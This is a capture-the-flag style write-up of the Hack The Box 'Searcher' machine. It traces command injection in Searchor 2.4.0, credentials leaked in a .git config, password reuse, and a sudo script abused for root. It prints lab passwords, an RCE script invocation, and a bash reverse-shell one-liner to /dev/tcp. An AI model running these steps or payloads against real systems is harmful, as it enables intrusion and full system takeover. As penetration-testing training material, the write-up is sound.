# Take Away
- With `.git` folder, it is important to look at `config` file for potential hardcoded credentials.
# Metadata
- Visiting `http://10.10.11.208:80/` will be redirected to `http://searcher.htb`. Within `http://searcher.htb`, one can identify `searchor 2.4.0` is part of the tech stack.![[Pasted image 20240228212836.png]]
	- A quick google will identify `searchor 2.4.0` is vulnerable to `Command Injection`.
- `linpeas` will identify two `git repositories`. One we have access, the other not.  ![[Pasted image 20240301123254.png]]
	- Looking at `/var/www/app/.git/config` file, one can identify a pair of credential `cody:jh1usoih2bkjaspwe92`.![[Pasted image 20240301124057.png]]
- `cody`'s password we identify is reused for local user `svc`. Running `sudo -l` with the password can identify that `svc` can run `/usr/bin/python3 /opt/scripts/system-checkup.py *` as root.![[Pasted image 20240301124416.png]]
	- Running the command reveals that we are provided with a few options with the `.py` file. ![[Pasted image 20240301164537.png]]
	- Running with `docker-ps` will show there are 2 containers running, one is `gitea` and the other is `mysql_db`.![[Pasted image 20240301165023.png]]
	- Running `docker-inspect '{{json .Config}}' mysql_db | jq` as argument will identify 2 more passwords.
		- One is database `root` password: `jI86kGUuj87guWr3RyF`
		- The other as `gitea:yuiu1hoiu4i5ho1uh`
		- ![[Pasted image 20240301165619.png]]
- `linpeas` will identify `gitea.searcher.htb` as one of the virtual host served by apache and is redirected to the docker container `gitea`.![[Pasted image 20240301171103.png]]
	- Navigate to `gitea.searcher.htb/explor/users`, one will find two users `cody` and `administrator`.![[Pasted image 20240301171303.png]]
	- One can identify that the `administrator` account reuses the password from `gitea` user in database. The content of file located at `/opt/scripts` can be found by navigating to `http://gitea.searcher.htb/administrator/script`.
- After analysis of the script `system-checkup.py`, we see that the option `full-checkup` runs a shell script with relative path.![[Pasted image 20240301172140.png]]
# Exploitation
- Download the script from `https://github.com/twisted007/Searchor_2.4.0_RCE_Python`. 
	- Run `python3 searchor-2_4_0_RCE.py searcher.htb 10.10.14.23 443` to receive a reverse shell session as local user `svc`.
# PrivEsc
- Run `echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/443 0>&1' > full-checkup.sh;chmod +x full-checkup.sh` at `/home/svc`.  At the same directory run `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup` to obtain a reverse shell call back as `root`.